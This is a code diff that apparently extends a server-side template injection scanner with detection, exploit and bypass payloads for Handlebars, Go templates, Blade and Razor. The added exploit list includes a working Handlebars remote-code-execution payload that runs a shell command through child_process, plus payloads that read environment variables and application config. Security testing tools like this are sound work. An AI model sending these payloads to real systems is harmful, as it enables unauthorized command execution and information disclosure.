@@ -112,6 +112,22 @@ _DETECT_PAYLOADS: list[tuple[str, str, str]] = [
 
     ("velocity_exec", "#set($str=$class.forName('java.lang.Runtime'))", "class"),
 
+    ("handlebars_math", "{{7*7}}", "49"),
+
+    ("handlebars_helper", '{{#with "s" as |s|}}{{#with "e"}}{{/with}}{{/with}}', "handlebars"),
+
+    ("go_math", "{{7*7}}", "49"),
+
+    ("go_println", '{{println "test"}}', "test"),
+
+    ("blade_math", "{{7*7}}", "49"),
+
+    ("blade_php", "@php echo 7*7 @endphp", "49"),
+
+    ("razor_math", "@(7*7)", "49"),
+
+    ("razor_expression", "@(1+1)", "2"),
+
 ]
 
 
@@ -178,6 +194,46 @@ _EXPLOIT_PAYLOADS: list[tuple[str, str, list[str]]] = [
 
     ),
 
+    (
+
+        "handlebars_rce",
+
+        "{{#with \"s\" as |s|}}{{#with \"e\"}}{{#with split as |c|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{this.push \"return require('child_process').execSync('id')\"}}{{#each c}}{{#with (string.sub apply=0) as |crtk|}}{{crtk this (lookup string.sub \"constructor\")}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+
+        ["uid=", "gid="],
+
+    ),
+
+    (
+
+        "go_env",
+
+        '{{env "PATH"}}',
+
+        ["/", "bin", "usr"],
+
+    ),
+
+    (
+
+        "blade_config",
+
+        "{{config('app.name')}}",
+
+        ["Laravel", "config", "app"],
+
+    ),
+
+    (
+
+        "razor_process",
+
+        "@(System.Environment.GetEnvironmentVariable(\"PATH\"))",
+
+        ["/", "bin", "usr"],
+
+    ),
+
 ]
 
 
@@ -205,6 +261,14 @@ _BYPASS_PAYLOADS: list[tuple[str, str, str]] = [
     ("erb_space", "<%= 7*7 %>", "49"),
 
     ("velocity_space", "#set( $x = 7*7 ) ${x}", "49"),
+
+    ("handlebars_space", "{{ 7*7 }}", "49"),
+
+    ("go_space", "{{ 7*7 }}", "49"),
+
+    ("blade_space", "{{ 7*7 }}", "49"),
+
+    ("razor_space", "@( 7*7 )", "49"),
 
 ]
 
@@ -340,7 +404,7 @@ def _extract_engine(technique: str) -> str:
 
     """Extrai nome da engine a partir da tecnica."""
 
-    for engine in ["jinja2", "twig", "freemarker", "mako", "pebble", "smarty", "erb", "velocity"]:
+    for engine in ["jinja2", "twig", "freemarker", "mako", "pebble", "smarty", "erb", "velocity", "handlebars", "go", "blade", "razor"]:
 
         if engine in technique.lower():
 
